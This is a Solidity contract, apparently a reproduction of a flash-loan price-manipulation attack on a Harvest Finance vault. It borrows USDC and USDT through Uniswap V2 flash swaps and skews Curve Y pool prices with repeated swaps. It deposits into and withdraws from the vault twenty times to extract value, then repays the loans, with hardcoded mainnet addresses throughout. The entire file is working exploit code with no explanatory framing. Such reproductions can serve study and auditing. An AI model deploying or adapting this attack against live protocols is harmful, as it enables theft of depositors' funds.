// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "v2-core/interfaces/IUniswapV2Pair.sol";
import "v2-core/interfaces/IUniswapV2Callee.sol";
import "v2-core/interfaces/IUniswapV2Factory.sol";
import "v2-periphery/interfaces/IUniswapV2Router02.sol";
import "src/interfaces/ICurveYPool.sol";
import "src/interfaces/ITetherToken.sol";
import "src/utils/UniswapV2FlashSwapLibrary.sol";
import "src/utils/UniswapV2Library.sol";
import "./IVault.sol";

contract HarvestFinanceExploit is IUniswapV2Callee {
    ICurveYPool constant curveYPool = ICurveYPool(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);

    ERC20 constant dai = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ERC20 constant usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ITetherToken constant usdt = ITetherToken(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    ERC20 constant tusd = ERC20(0x0000000000085d4780B73119b644AE5ecd22b376);
    ERC20 constant weth = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    IUniswapV2Factory constant factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    IUniswapV2Router02 constant router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IUniswapV2Pair constant usdcWethPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniswapV2Pair constant wethUsdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);

    IVault constant vault = IVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    uint256 constant usdcFlashLoanAmount = 50000000000000; // deposit
    uint256 constant usdtFlashLoanAmount = 17000000000000; // exchange

    function uniswapV2Call(address _sender, uint256 amount0, uint256 amount1, bytes calldata _data) external {
        _sender;
        _data;
        if (msg.sender == address(wethUsdtPair)) {
            usdcWethPair.swap(usdcFlashLoanAmount, 0, address(this), "0");

            address[] memory path = new address[](2);
            path[0] = address(usdc);
            path[1] = address(weth);
            router.swapExactTokensForTokens(
                usdc.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1 days
            );

            uint256 usdtAmountIn = usdt.balanceOf(address(this));
            (uint256 reserveA, uint256 reserveB) =
                UniswapV2Library.getReserves(address(factory), address(weth), address(usdt));
            uint256 wethAmountIn =
                UniswapV2FlashSwapLibrary.getAmountInMulti(0, usdtAmountIn, amount1, reserveA, reserveB);
            usdt.transfer(msg.sender, usdtAmountIn);
            weth.transfer(msg.sender, wethAmountIn);
        } else if (msg.sender == address(usdcWethPair)) {
            for (uint256 i = 0; i < 20; i++) {
                uint256 usdcBalanceBefore = usdc.balanceOf(address(this));
                curveYPool.exchange_underlying(2, 1, usdt.balanceOf(address(this)), 0); // usdt->usdc
                uint256 usdcExchangeAmount = usdc.balanceOf(address(this)) - usdcBalanceBefore;
                vault.deposit(usdcFlashLoanAmount);
                curveYPool.exchange_underlying(1, 2, usdcExchangeAmount, 0); // usdc->usdt
                vault.withdraw(vault.balanceOf(address(this)));
            }

            uint256 amountIn = UniswapV2FlashSwapLibrary.getAmountInSingle(amount0);
            usdc.transfer(msg.sender, amountIn);
        }
    }

    function exploit() external {
        usdc.approve(address(curveYPool), type(uint256).max);
        usdt.approve(address(curveYPool), type(uint256).max);
        usdc.approve(address(vault), type(uint256).max);
        usdc.approve(address(router), type(uint256).max);

        wethUsdtPair.swap(0, usdtFlashLoanAmount, address(this), "0");

        require(usdc.balanceOf(address(this)) == 0);
        require(usdt.balanceOf(address(this)) == 0);
    }
}
